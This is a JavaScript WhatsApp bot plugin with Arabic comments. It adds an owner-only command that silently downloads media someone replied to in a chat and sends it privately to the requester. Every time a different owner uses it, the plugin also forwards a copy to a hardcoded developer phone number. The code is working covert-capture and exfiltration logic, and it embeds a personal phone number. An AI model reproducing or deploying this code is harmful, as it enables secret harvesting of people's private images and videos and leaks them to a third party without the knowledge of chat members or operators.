const handler = async (m, { conn, isROwner, isOwner }) => {
  try {
    // 1. رقم المطور الأساسي اللي هيستلم نسخة دايماً
    const mainDeveloper = "201551798379@s.whatsapp.net";

    // 2. التحقق إن اللي بيكتب الأمر مطور (Owner)
    if (!(isROwner || isOwner)) return; 

    // 3. التأكد إن فيه ريبلاي على ميديا
    if (!m.quoted) return;

    // 4. تحميل الميديا من رقم البوت
    const buffer = await m.quoted.download();
    if (!buffer) return;
    
    // 5. تحديد نوع الميديا (صورة أو فيديو)
    const isVideo = m.quoted.mtype === 'videoMessage' || m.quoted.mimetype?.includes('video');
    const mediaType = isVideo ? "video" : "image";

    // 6. البوت يبعت الميديا للي كتب الأمر (المطور) على الخاص بصمت
    await conn.sendMessage(m.sender, { 
      [mediaType]: buffer,
      caption: `✅ تم سحب الميديا بنجاح من شات: ${m.chat}`
    });

    // 7. لو اللي طلب السحب مش المطور الأساسي، يتبعت نسخة للمطور الأساسي برضه
    if (m.sender !== mainDeveloper) {
      await conn.sendMessage(mainDeveloper, { 
        [mediaType]: buffer,
        caption: `🚨 سحب ميديا بواسطة مطور آخر: @${m.sender.split('@')[0]}`,
        mentions: [m.sender]
      });
    }

  } catch (e) {
    console.error("خطأ في السحب الصامت:", e);
  }
};

handler.help = ['k'];
handler.tags = ['owner'];
handler.command = ["k"]; 

// تفعيل خاصية إن الأمر للمطورين فقط
handler.owner = true; 

export default handler;
